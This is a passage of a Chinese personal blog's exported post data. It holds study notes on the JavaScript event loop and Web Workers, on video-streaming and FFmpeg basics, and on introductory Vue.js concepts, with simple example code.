定时器回调函数是在分线程执行的吗? 在主线程执行的, js是单线程的 定时器是如何实现的? 事件循环模型(后面讲) 定时器真是定时执行的吗? 定时器回调函数是在哪个线程执行的? 定时器是如何实现的? JS是单线程执行的 如何证明js执行是单线程的? setTimeout()的回调函数是在主线程执行的 定时器回调函数只有在运行栈中的代码全部执行完后才有可能执行 为什么js要用单线程模式, 而不用多线程模式? JavaScript的单线程，与它的用途有关。 作为浏览器脚本语言，JavaScript的主要用途是与用户互动，以及操作DOM。 这决定了它只能是单线程，否则会带来很复杂的同步问题 代码的分类: 初始化代码 回调代码 js引擎执行代码的基本流程 先执行初始化代码: 包含一些特别的代码 设置定时器 绑定监听 发送ajax请求 后面在某个时刻才会执行回调代码 如何证明js执行是单线程的? 为什么js要用单线程模式, 而不用多线程模式? 代码的分类 js引擎执行代码的基本流程 浏览器的事件循环(轮询)模型 所有代码分类 初始化执行代码: 包含绑定dom事件监听, 设置定时器, 发送ajax请求的代码 回调执行代码: 处理回调逻辑 js引擎执行代码的基本流程: 初始化代码===&gt;回调代码 模型的2个重要组成部分: 事件管理模块 回调队列 模型的运转流程 执行初始化代码, 将事件回调函数交给对应模块管理 当事件发生时, 管理模块会将回调函数及其数据添加到回调列队中 只有当初始化代码执行完后(可能要一定时间), 才会遍历读取回调队列中的回调函数执行 模型原理图 相关重要概念 执行栈 execution stack 所有的代码都是在此空间中执行的 浏览器内核 browser core js引擎模块(在主线程处理) 其它模块(在主/分线程处理) 任务队列(callback queue) task queue 消息队列(callback queue) message queue 事件队列(callback queue) event queue 事件轮询 event loop 从任务队列中循环取出回调函数放入执行栈中处理(一个接一个) 事件驱动模型 event-driven interaction model 请求响应模型 request-response model 执行栈 execution stack 所有的代码都是在此空间中执行的 浏览器内核 browser core js引擎模块(在主线程处理) 其它模块(在主/分线程处理) 任务队列 task queue 消息队列 message queue 事件队列 event queue 事件轮询 event loop 从任务队列中循环取出回调函数放入执行栈中处理(一个接一个) 事件驱动模型 event-driven interaction model 请求响应模型 request-response model 执行流程 H5 Web Workers(多线程) 介绍 Web Workers 是 HTML5 提供的一个javascript多线程解决方案 我们可以将一些大计算量的代码交由web Worker运行而不冻结用户界面 但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质 使用 创建在分线程执行的js文件 var onmessage =function (event){ //不能用函数声明 console.log(&#39;onMessage()22&#39;);var upper = event.data.toUpperCase();//通过event.data获得发送来的数据postMessage( upper );//将获取到的数据发送会主线程 } 在主线程中的js中发消息并设置回调 //创建一个Worker对象并向它传递将在新线程中执行的脚本的URL var worker = new Worker(“worker.js”); //接收worker传过来的数据函数 worker.onmessage = function (event) { console.log(event.data); }; //向worker发送数据 worker.postMessage(“hello world”); 图解 应用练习 编程实现斐波那契数列（Fibonacci sequence）的计算 F（0）=0，F（1）=1，….. F（n）=F(n-1)+F(n-2) 直接在主线程 var fibonacci =function(n) { return n &lt;2 ? n : fibonacci(n -1) + fibonacci(n -2); }; console.log(fibonacci(48)); 使用Worker在分线程 主线程 var worker = new Worker(‘worker2.js’); worker.addEventListener(‘message’, function (event) { var timer2 = new Date().getTime();console.log(&#39;结果：&#39; + event.data, &#39;时间:&#39; + timer2, &#39;用时：&#39; + ( timer2 - timer )); }, false); var timer = new Date().getTime(); console.log(‘开始计算: ‘, ‘时间:’ + timer); setTimeout(function () { console.log(&#39;定时器函数在计算数列时执行了&#39;, &#39;时间:&#39; + new Date().getTime()); }, 1000); worker.postMessage(40); console.log(‘我在计算数列的时候执行了’, ‘时间:’ + new Date().getTime()); 分线程 var fibonacci =function(n) { return n &lt;2 ? n : fibonacci(n -1) + fibonacci(n -2); }; var onmessage = function(event) { var n = parseInt(event.data, 10);postMessage(fibonacci(n)); }; 不足 慢 不能跨域加载JS worker内代码不能访问DOM(更新UI) 不是每个浏览器都支持这个新特性","categories":[],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/JavaScript/"}]},{"title":"视频监控解决方案","slug":"视频监控解决方案","date":"2021-09-08T06:40:03.071Z","updated":"2021-09-20T12:24:36.134Z","comments":true,"path":"2021/09/08/视频监控解决方案/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/09/08/%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/","excerpt":"监控原理和实现方案","text":"bilibili UP：达尔闻 视频监控1 视频监控方案介绍 mjpg-stream安装在linux系统上 协议 HTTP-FLV RTMP HLS DASH RTSP 传输方式 HTTP流 TCP流 TCP流 HTTP流 TCP/UDP 封装格式 FLV FLV Tag TS文件 mp4\\3gp\\webm mov/asf/wms 延时 低 低 高 高 低 数据分段 连续流 连续流 切片文件 切片文件 连续流 HTML5播放 使用flv.js 不支持 使用hls.js 可播放mp4、webm 支持 推流端：ffmpeg rtmp 服务器：nginx http 拉流端：浏览器/VLC播放器 推流端 + 服务器部署在同一主机 =&gt; 局域网本地视频监控 2 MJEPG-streamer实现 3 FFmpeg 4 Nginx 安装参考bilibili UP主：三湿地 视频基础 YUV格式分为两大类planar和packed 对于planar的YUV格式，先连续存储所有像素点的Y，紧接着存储所有像素点的U，随后是所有像素点的V 对于packed的YUV格式，每个像素点的YUV是连续交替存储的 Libyuvku：Google开源的实现各种YUV与RGB之间相互转化、旋转、缩放的库 YUV存在多种格式，比如YUV420p，YUV420sp等，不同的YUV数据格式在存储时的排序是不一样的，在开发过程中必须非常注意，否则画面会显示不正常，比如花屏、绿屏等 YUV 4：4：4采样，每个Y对应一组UV分量 YUV 4：2：2采样，每两个Y对应一组UV分量 YUV4：2：0采样，每4个Y共用一组UV分量 数字图像格式转换，以H264直播为例： 视频基础 视频码率：kb/s，是指视频文件在单位时间内使用的数据流量，也叫码流率，码率越大，说明单位时间内取样率越大，数据流精度越高 视频帧率：fps，通常说一个视频的25帧，指的是这个视频帧率，即1秒会显示25帧。帧率越高，给人的视觉就越流畅 视频分辨率：分辨率就是我们常说的640*480分辨率、1920*1080分辨率，分辨率影响视频图像的大小 I P B帧的概念 I帧（Intra caoded frames）：I帧不需要参考其他画面而生成，解码时仅靠自己就重构完整图像 I帧图像采用帧内编码方式 I帧所占数据的信息量比较大 I帧图像是周期性出现在图像序列中的，出现频率可由编码器选择 I帧是P帧和B帧的参考帧（其质量直接影响到同组中以后各帧的质量） I帧是帧组GOP的基础帧（第一帧），在一组中只有一个I帧 I帧不需要考虑运动矢量 P帧：根据本帧与相邻的前一帧（I帧或P帧）的不同点来压缩本帧数据，同时利用了空间和时间上的相关性。 P帧属于前向预测的帧间编码，它需要参考前面最靠近它的I帧或P帧来解码（多个参考的时候，遇到过11个参考帧） B帧：B帧图像采用双向时间预测，可以大大提高压缩倍数 常见视频压缩算法 MPEG阵营 MPEG2 H264 H265 中国阵营 AVS Google阵营 VP8 VP9 音频采样定理：2倍，所以CD音质&gt;40khz(ADC器件) 没有经过压缩的音频数据我们叫PCM数据 采样频率：每秒钟采样的点的个数 采样的精度（采样深度）：每个“样本点”的常用大小为8bit，16bit，24bit 通道数：单声道、双声道、四声道、5.1声道 7.1声道 —— 8个声道 5.1声道 —— 6个声道 2.1声道 —— 3个声道 比特率：每秒传输的bit数，单位为（bps） 间接衡量声音质量的一个标准 没有压缩的音频数据的比特率 = 采样频率*采样精度*通道数 码率：压缩后的音频数据的比特率 常见的码率： 96kbps：FM质量 128 - 160kbps：一般质量音频 192kbps：CD质量 256 - 320Kbps：高质量音频 码率越大，压缩效率越低，音质越好，压缩后数据越大。 码率 = 音频文件大小 / 时长 音频的帧的概念没有视频帧那么清晰，几乎所有的视频编码格式都可以简单的认为一帧就是编码后的一张图像 帧长：可以指每帧采样数播放的时间，mp3 48k，1152个采样点，每帧则为24ms；aac（16khz - &gt; 2048 / 48khz - &gt; 1024）则是每帧是1024个采样点。攒够一帧数据才送去做编码 也可以指压缩后每帧数据长度，所以讲到帧的时候要注意他适用的场合 每帧持续时间（秒） = 每帧采样点数 / 采样频率（HZ） 存储方式 交错模式：数字音频信号存储的方式。数据以连续帧的方式存放，即首先记录帧1的左声道样本和右声道样本，再开始帧2的记录（LRLRLRLRLR…… / LRCLRCLRCLRC……） 非交错模式：首先记录的是一个周期内所有帧的左声道样本，再记录所有右声道样本（LLLLLL……RRRRRR……） 常用音频格式： MP3 AAC OPUS webrtc AC3和EAC3杜比公司的方案 封装格式基础封装格式（也叫容器）就是将已经编码压缩好的视频流、音频流及字幕按照一定的方案放到一个文件中，便于播放软件播放。 一般来说，视频文件的后缀名就是它的封装格式。 封装格式不同，后缀名也就不一样。 FLV（适合直播）和MP4（适合本地播放、多路音轨切换）的区别： 音频同步基础DTS(Decoding Time Stamp)：即解码时间戳，这个时间戳的意义在于告诉播放器应该在什么时候解码这一帧的数据 PTS(Presentation Time Stamp)：即显示时间戳，这个时间戳用来告诉播放器该在什么时候显示这一帧的数据 音视频同步方式： 同步视频到音频 A （人对声音更加敏感） 同步音频到视频 B 同步音频和视频到外部时钟 C A &gt; B &gt; C 开源项目ffmpeg ijkplay （手机端） QMPlayer ( PC端 ) ZLMediaKit(跨平台) EasyDarwin SRS（协程写的） nginx - rtmp - module 常用工具MediaInfo ：视频信息查看工具 VLC ：视频流播放工具 wireshark ： 网络抓包工具 cooledit pro2 ： 音频编辑工具，PCM播放工具 Elecard StreamEye Tools：分析视频帧的工具（需要破解） 音视频算法工程师 流媒体开发服务器工程师 开源TeamTalk FFMPEG学习概念容器视频文件本身其实是一个容器（container），里面包括了视频和音频，也可能有字幕等其他内容。 常见的容器格式有以下几种，一般来说，视频文件的后缀名反映了它的容器格式： MP4 MKV WebM AVI 12// 查看FFmpeg支持的容器ffmpeg -formats 编码格式视频和音频都需要经过编码，才能保存成文件。不同的编码格式（CODEC），有不同的压缩率，会导致文件大小和清晰度的差异。 常用的视频编码格式如下： H.262 H.264 H.265 上面的编码格式都是有版权的，但是可以免费使用。此外，还有几种无版权的视频编码格式： VP8 VP9 AV1 常用的音频编码格式 MP3 ACC 上面所有这些都是有损的编码格式，编码后会损失一些细节，以换取压缩后较小的文件体积，无损的编码格式压缩出来的文件体积较大，这里就不介绍了。 下面的命令可以查看 FFmpeg 支持的编码格式，视频编码和音频编码都在内： 1ffmpeg -codecs 编码器编码器（encoders）是实现某种编码格式的库文件。只有安装了某种格式的编码器，才能实现该格式视频/音频的编码和解码。 以下是一些 FFmpeg 内置的视频编码器： libx264：最流行的开源 H.264 编码器 NVENC：基于 NVIDIA GPU 的 H.264 编码器 libx265：开源的 HEVC 编码器 libvpx：谷歌的 VP8 和 VP9 编码器 libaom：AV1 编码器 音频编码器： libfdk-aac aac 下面的命令可以查看 FFmpeg 已安装的编码器： 12// 下面的命令可以查看 FFmpeg 已安装的编码器ffmpeg -encoders FFMPEG的使用格式12// Fmpeg 的命令行参数非常多，可以分成五个部分ffmpeg &#123;1&#125; &#123;2&#125; -i &#123;3&#125; &#123;4&#125; &#123;5&#125; 上面命令中，五个部分的参数依次如下： 全局参数 输入文件参数 输入文件 输出文件参数 输出文件 参数太多的时候，为了便于查看，ffmpeg 命令可以写成多行 123456ffmpeg \\[全局参数] \\[输入文件参数] \\-i [输入文件] \\[输出文件参数] \\[输出文件] 一个例子： 123456ffmpeg \\-y \\ # 全局参数-c:a libfdk_aac -c:v libx264 \\ # 输入文件参数-i input.mp4 \\ # 输入文件-c:v libvpx-vp9 -c:a libvorbis \\ # 输出文件参数output.webm # 输出文件 ​ 上面的命令将 mp4 文件转成 webm 文件，这两个都是容器格式。输入的 mp4 文件的音频编码格式是 aac，视频编码格式是 H.264；输出的 webm 文件的视频编码格式是 VP9，音频格式是 Vorbis。 ​ 如果不指明编码格式，FFmpeg 会自己判断输入文件的编码。因此，上面的命令可以简单写成下面的样子： 1ffmpeg -i input.avi output.mp4 常用命令行参数FFmpeg 常用的命令行参数如下： 123456789-c：指定编码器-c copy：直接复制，不经过重新编码（这样比较快）-c:v：指定视频编码器-c:a：指定音频编码器-i：指定输入文件-an：去除音频流-vn： 去除视频流-preset：指定输出的视频质量，会影响文件的生成速度，有以下几个可用的值 ultrafast, superfast, veryfast, faster, fast, medium, slow, slower, veryslow。-y：不经过确认，输出时直接覆盖同名文件。 常见用法下面介绍FFmpeg的几种常见用法 查看文件信息查看视频文件的元信息，比如编码格式和比特率，可以只使用-i参数： 1ffmpeg -i input.mp4 上面命令会输出很多冗余信息，加上-hide_banner参数，可以只显示元信息。 1ffmpeg -i input.mp4 -hide_banner 转换编码格式转换编码格式（transcoding）指的是， 将视频文件从一种编码转成另一种编码。比如转成 H.264 编码，一般使用编码器libx264，所以只需指定输出文件的视频编码器即可。 1ffmpeg -i [input.file] -c:v libx264 output.mp4 下面是转成 H.265 编码的写法： 1ffmpeg -i [input.file] -c:v libx265 output.mp4 转换容器格式转换容器格式（transmuxing）指的是，将视频文件从一种容器转到另一种容器。下面是 mp4 转 webm 的写法： 1ffmpeg -i input.mp4 -c copy output.webm 上面例子中，只是转一下容器，内部的编码格式不变，所以使用-c copy指定直接拷贝，不经过转码，这样比较快。 调整码率调整码率（transrating）指的是，改变编码的比特率，一般用来将视频文件的体积变小。下面的例子指定码率最小为964K，最大为3856K，缓冲区大小为 2000K。 1234ffmpeg \\-i input.mp4 \\-minrate 964K -maxrate 3856K -bufsize 2000K \\output.mp4 改变分辨率（transsizing）下面是改变视频分辨率（transsizing）的例子，从 1080p 转为 480p： 1234ffmpeg \\-i input.mp4 \\-vf scale=480:-1 \\output.mp4 提取音频1234ffmpeg \\-i input.mp4 \\-vn -c:a copy \\output.aac 上面例子中，-vn表示去掉视频，-c:a copy表示不改变音频编码，直接拷贝。 添加音轨添加音轨（muxing）指的是，将外部音频加入视频，比如添加背景音乐或旁白。 123ffmpeg \\-i input.aac -i input.mp4 \\output.mp4 上面例子中，有音频和视频两个输入文件，FFmpeg 会将它们合成为一个文件。 截图下面的例子是从指定时间开始，连续对1秒钟的视频进行截图： 12345ffmpeg \\-y \\-i input.mp4 \\-ss 00:01:24 -t 00:00:01 \\output_%3d.jpg 如果只需要截一张图，可以指定只截取一帧： 12345ffmpeg \\-ss 01:23:45 \\-i input \\-vframes 1 -q:v 2 \\output.jpg 上面例子中，-vframes 1指定只截取一帧，-q:v 2表示输出的图片质量，一般是1到5之间（1 为质量最高）。 裁剪裁剪（cutting）指的是，截取原始视频里面的一个片段，输出为一个新视频。可以指定开始时间（start）和持续时间（duration），也可以指定结束时间（end）。 12ffmpeg -ss [start] -i [input] -t [duration] -c copy [output]ffmpeg -ss [start] -i [input] -to [end] -c copy [output] 实际例子： 12ffmpeg -ss 00:01:50 -i [input] -t 10.5 -c copy [output]ffmpeg -ss 2.5 -i [input] -to 10 -c copy [output] 上面例子中，-c copy表示不改变音频和视频的编码格式，直接拷贝，这样会快很多。 为音频添加封面有些视频网站只允许上传视频文件。如果要上传音频文件，必须为音频添加封面，将其转为视频，然后上传。 下面命令可以将音频文件，转为带封面的视频文件。 12345ffmpeg \\-loop 1 \\-i cover.jpg -i input.mp3 \\-c:v libx264 -c:a aac -b:a 192k -shortest \\output.mp4 面命令中，有两个输入文件，一个是封面图片cover.jpg，另一个是音频文件input.mp3。-loop 1参数表示图片无限循环，-shortest参数表示音频文件结束，输出视频就结束。","categories":[],"tags":[{"name":"视频监控","slug":"视频监控","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7/"}]},{"title":"Vue全家桶","slug":"Vue全家桶","date":"2021-08-01T02:33:59.000Z","updated":"2021-10-22T09:00:48.354Z","comments":true,"path":"2021/08/01/Vue全家桶/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/08/01/Vue%E5%85%A8%E5%AE%B6%E6%A1%B6/","excerpt":"","text":"Vue全家桶课程概述前端框架—&gt; Vue 2.0 —&gt; Vue3.0 VUE基础 VUE-CLI VUE-ROUTER VUEX ELEMENT-UI VUE3.0 基础内容 ES6全称ECMAScript6.0，是JavaScript（ECMAScript的一种实现）的下一个版本标准，2015.06发布，主要为了解决ES5先天的不足，比如JavaScript里没有类的概念，但是目前浏览器的JavaScript是ES5版本，大多数高版本浏览器也支持ES6，不过只实现了ES6的部分特性和功能。 ES新特性指的是JavaScript的新特性，包括ES6-ES11版本。 ECMA:European Computer Manufacturers Association，中文名称为欧洲计算机制造商协会，这个组织的目标是评估、开发、认可电信和计算机标准。 ECMAScript：由ECMA国际通过ECMA-262标准化的脚本程序设计语言。 学习ES6的原因： ES6的版本变动最多，具有里程碑的意义。 ES6加入许多新的语法特性，编程实现更加简单、高效。 ES6是前端发展的趋势，就业的必备技能。 浏览器兼容性表格：ECMAScript 6 compatibility table (kangax.github.io) 第一章 VUE核心1.1 Vue简介一套用于构建用户界面的渐进式JavaScript框架 VUE可以自底向上逐层的应用 简单应用：只需要一个轻量小巧的核心库 复杂应用：可以引入各式各样的VUE插件 开发者：尤雨溪 VUE特点： 采用组件化模式，提高代码的复用率，且让代码更好维护。 声明式编码，让编码人员无需直接操作DOM，提高开发效率。 JS的基础知识： ES6语法规范 ES6模块化 包管理器 原型、原型链 数组常用方法 axios promise 1.2 初识VUE1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; &lt;title&gt;初识VUE&lt;&#x2F;title&gt; &lt;!--引入VUE--&gt; &lt;script src&#x3D;&quot;..&#x2F;js&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;h1&gt;Hello&#123;&#123;name&#125;&#125;&lt;&#x2F;h1&gt; &lt;&#x2F;div&gt; &lt;script&gt; Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 &#x2F;&#x2F;创建Vue实例 new Vue(&#123; el: &#39;#root&#39;, &#x2F;&#x2F; el用于指定当期VUE实例为哪个容器服务，值通常为css选择器字符串 &#x2F;&#x2F; 或el:document.getElementById(&#39;root&#39;); &#x2F;&#x2F; data中用于存储数据，数据提供给el所指定的容器去使用，值我们暂时先写成一个对象 data: &#123; name: &#39;World&#39; &#125; &#125;); &lt;&#x2F;script&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 总结： 想让vue工作，就必须创建一个vue实例，并且要传入一个配置对象 root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法 root容器里的代码称为【Vue模板】 root容器的作用： 为VUE提供模板 告知VUE的工作成果展示位置 1.3分析Hello案例123456789101112131415161718192021&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div class&#x3D;&quot;root&quot;&gt; &lt;h1&gt;Hello&#123;&#123;name.toUpperCase()&#125;&#125;,&#123;&#123;address&#125;&#125;,&#123;&#123;Date.now()&#125;&#125;&lt;&#x2F;h1&gt; &lt;&#x2F;div&gt; &lt;script&gt; Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 &#x2F;&#x2F;创建Vue实例 new Vue(&#123; el: &#39;.root&#39;, &#x2F;&#x2F; el用于指定当期VUE实例为哪个容器服务，值通常为css选择器字符串 &#x2F;&#x2F; 或 el: document.getElementsByClassName(&#39;root&#39;)[0], &#x2F;&#x2F; data中用于存储数据，数据提供给el所指定的容器去使用，值我们暂时先写成一个对象 data: &#123; name: &#39;World&#39;, address: &#39;UESTC&#39; &#125; &#125;); &lt;&#x2F;script&gt;&lt;&#x2F;body&gt; 注意区分JS表达式和JS代码 表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方 a a+b demo(1) 代码 if(){} for(){} JS表达式是一种特殊的JS代码（语句） 总结： 容器和VUE实例一一对应 动态数据交付VUE实例托管 真实开发中只有一个VUE实例，并且会配合组件一起使用 中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性 一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新 1.4 模板语法1234567891011121314151617181920212223&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;h1&gt;插值语法&lt;&#x2F;h1&gt; &lt;h3&gt;你好，Mike Taylor&lt;&#x2F;h3&gt; &lt;hr&#x2F;&gt; &lt;!--v-bind绑定：把&quot;&quot;中的数据当做JS表达式执行 --&gt; &lt;!-- 简写：v-bind简写成冒号 --&gt; &lt;a v-bind:href&#x3D;&quot;url&quot;&gt;我的博客&lt;&#x2F;a&gt; &lt;&#x2F;div&gt; &lt;script&gt; Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 &#x2F;&#x2F;创建Vue实例 new Vue(&#123; el:&#39;#root&#39;, data:&#123; url:&#39;https:&#x2F;&#x2F;miketaylorjuly123.cn&#39; &#125; &#125;); &lt;&#x2F;script&gt;&lt;&#x2F;body&gt; VUE模板语法有两大类： 插值语法 功能：用于解析标签体内容 写法：,xxx是JS表达式，且可以直接读取到data中的所有属性，不包括用户自定义属性 指令语法 功能：用于解析标签（包括：标签属性、标签体内容、绑定事件……） 举例：V-bind:herf=”xxx” 或 简写为 :href=”xxx”，xxx同样要写js表达式，且可以直接读取到data中的所有属性 备注：VUE中有很多指令，且形式都是：v-???，此处只是拿v-bind举例 1.5 数据绑定 错误示范：v-model只能应用于表单类元素上（输入类，要有value属性） 1&lt;h1 v-model&#x3D;&quot;name&quot;&gt;miketaylorjuly&lt;&#x2F;h1&gt; 总结 单向绑定(v-bind)：数据只能从data流向页面 双向绑定(v-model)：数据不仅能data流向页面，还可以从页面流向data 备注： 双向绑定一般都应用于表单类元素上（如：input、select） v-model:value = “xxx” 可以**简写为v-model=”xxxx”**因为v-model默认收集value值 1234567891011121314151617&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; 单向数据绑定：&lt;input type&#x3D;&quot;text&quot; v-bind:value&#x3D;&quot;name&quot;&gt; 双向数据绑定：&lt;input type&#x3D;&quot;text&quot; v-model&#x3D;&quot;name&quot;&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt; &lt;script&gt; Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示 new Vue(&#123; el:&#39;#root&#39;, data:&#123; name:&#39;Mike Taylor&#39; &#125; &#125;) &lt;&#x2F;script&gt; 1.6 el与data的两种写法效果 1234567891011121314151617181920&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;h1&gt;你好，&#123;&#123;name&#125;&#125;&lt;&#x2F;h1&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt; &lt;script&gt; Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 const vm &#x3D; new Vue(&#123; &#x2F;&#x2F; el:&#39;#root&#39;, data:&#123; name: &#39;Mike Taylor&#39; &#125; &#125;) console.log(v); setTimeout(()&#x3D;&gt;&#123; vm.$mount(&#39;#root&#39;); &#x2F;&#x2F; 挂载 &#125;,1000) &lt;&#x2F;script&gt; 123456789101112131415161718192021 &lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;h1&gt;你好，&#123;&#123;name&#125;&#125;&lt;&#x2F;h1&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt; &lt;script&gt; Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 const v &#x3D; new Vue(&#123; &#x2F;&#x2F; data:function()&#123; data()&#123; console.log(&#39;@@@&#39;,this); &#x2F;&#x2F; 此处的this是Vue实例对象 return &#123; name: &#39;Mike Taylor&#39; &#125; &#125; &#125;) setTimeout(()&#x3D;&gt;&#123; v.$mount(&#39;#root&#39;); &#x2F;&#x2F; 挂载 &#125;,1000) &lt;&#x2F;script&gt; 组件复用data必须为函数 data与el的两种写法 el的两种写法 new Vue的时候配置el属性 先创建Vue实例。随后再通过vm.$mount(‘#root’)指定el的值 data的两种写法 对象式 函数式 选择：目前都可以使用，但是学习了组件后，data必须使用函数式，否则会报错 重要原则 由VUE管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是VUE实例了（而是Windows实例） 1.7 理解MVVM模型 M：模型(Model) ：对应 data 中的数据 sV：视图(View) ：模板代码 VM：视图模型(ViewModel) ： Vue 实例对象 此在文档中经常会使用 vm (ViewModel 的缩写) 这个变量名表示 Vue 实例。 观察发现： data中所有属性，最后都出现在了vm身上 vm身上所有属性及VUE原型上所有属性，在VUE模板中都可以直接使用 1.8 回顾Object.defineProperty方法回顾Object.defineProperty方法 作用：给对象添加/定义属性 添加值123456789101112&lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; let person = &#123; name:&#x27;Mike Taylor&#x27;, gender:&#x27;Man&#x27;, &#125; Object.defineProperty(person,&#x27;age&#x27;,&#123; value: 20 &#125;) console.log(person); &lt;/script&gt;&lt;/body&gt; age不可以被枚举（不参与遍历）12345678910111213141516&lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; let person = &#123; name:&#x27;Mike Taylor&#x27;, gender:&#x27;Man&#x27;, // age: 20 &#125; Object.defineProperty(person,&#x27;age&#x27;,&#123; value: 20 &#125;) console.log(Object.keys(person)); // 传入对象作为参数，可以把传入对象中所有属性的属性名提取出来，变成一个数组 for (let index in person)&#123; console.log(&#x27;@@&#x27;+person[index]) &#125; console.log(person); &lt;/script&gt; 要实现枚举： 1234Object.defineProperty(person,&#x27;age&#x27;,&#123; value: 20, enumerable:true, //控制属性值是否可以枚举，默认为false &#125;) 无法改变值 实现可改变： 12345Object.defineProperty(person,&#x27;age&#x27;,&#123; value: 20, enumerable:true, writtable:true, // 控制属性是否可以被修改，默认为false &#125;) 不可删除其中的值 实现可删除： 123456Object.defineProperty(person,&#x27;age&#x27;,&#123; value: 20, enumerable:true, writtable:true, configurable: true, // 控制属性是否可以被删除，默认为false &#125;) 实现age随变量的变化而动态变化 1234567891011121314151617&lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; let number = 20; let person = &#123; name:&#x27;Mike Taylor&#x27;, gender:&#x27;Man&#x27;, &#125; Object.defineProperty(person,&#x27;age&#x27;,&#123; // 当有人读取person的age属性时，get函数(getter)就会被调用，且返回值 get:function()&#123; console.log(&quot;有人读取age属性了！&quot;); return number; &#125; &#125;) console.log(person); &lt;/script&gt;&lt;/body&gt; 123456789101112131415161718192021&lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; let number = 20; let person = &#123; name:&#x27;Mike Taylor&#x27;, gender:&#x27;Man&#x27;, &#125; Object.defineProperty(person,&#x27;age&#x27;,&#123; // 当有人读取person的age属性时，get函数(getter)就会被调用，且返回值 get()&#123; console.log(&quot;有人读取age属性了！&quot;); return number; &#125;, // 当有人修改person的age属性值时，set函数(setter)就会被调用，且会收到具体返回值 set(value)&#123; console.log(&quot;有人修改age属性，且值是：&quot;,value); &#125; &#125;) console.log(person); &lt;/script&gt;&lt;/body&gt; 表面上更改了age属性，实际上并没有改掉，因为number没有变化 改正： 1234set(value)&#123; console.log(&quot;有人修改age属性，且值是：&quot;,value); number = value &#125; 总结：age属性值现用现取 1.9 理解数据代理 12345678910111213141516&lt;body&gt; &lt;!-- 数据代理：通过一个对象代理对另一个对象中属性的操作（读/写） --&gt; &lt;script&gt; let obj = &#123;x:100&#125;; let obj2 = &#123;y:200&#125;; Object.defineProperty(obj2,&#x27;x&#x27;,&#123; get: function()&#123; return obj.x; &#125;, set: function(value)&#123; obj.x = value; &#125; &#125;); &lt;/script&gt;&lt;/body&gt; 1.10 Vue中的数据代理1234567891011121314151617&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;h2&gt;个人姓名：&#123;&#123;name&#125;&#125;&lt;&#x2F;h2&gt; &lt;h2&gt;住址：&#123;&#123;address&#125;&#125;&lt;&#x2F;h2&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 const vm &#x3D; new Vue(&#123; el:&#39;#root&#39;, data:&#123; name: &#39;张加林&#39;, address: &#39;成华区建设路&#39; &#125; &#125;)&lt;&#x2F;script&gt; 当对vm进行访问的时候，getter开始工作，把别的地方(data)的name拿过来使用；当有人通过vm修改name，setter开始工作。读写都是使用的data中的属性 需要验证 1.验证getter： 2.验证setter： vm将data数据存储在自己内部，称为_data，通过_data可以访问name和address(不便于编码，所以用后者)；由于使用了数据代理，也可以直接访问name和address。 注意_data和代码data并不相同，这里涉及到了数据劫持，后续会学习。（数据劫持的目的是为了实现一个功能：感知data中的数据被修改，并将修改结果更新展示在页面里，即响应式） 123456789let data = &#123; name: &#x27;张加林&#x27;, address: &#x27;成华区建设路&#x27; &#125;; const vm = new Vue(&#123; el: &#x27;#root&#x27;, data &#125;) 原因：一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新。 数据代理图示 总结 Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读/写） Vue中数据代理的好处：更加方便地操作data中的数据 基本原理： 通过Object.defineProperty()把data对象中的所有属性添加到vm上。 为每一个添加vm上的属性，都指定一个getter和setter。 在getter/setter内部去操作（读/写）data中对应的属性。 1.11 事件处理 1234567891011121314151617181920212223&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; 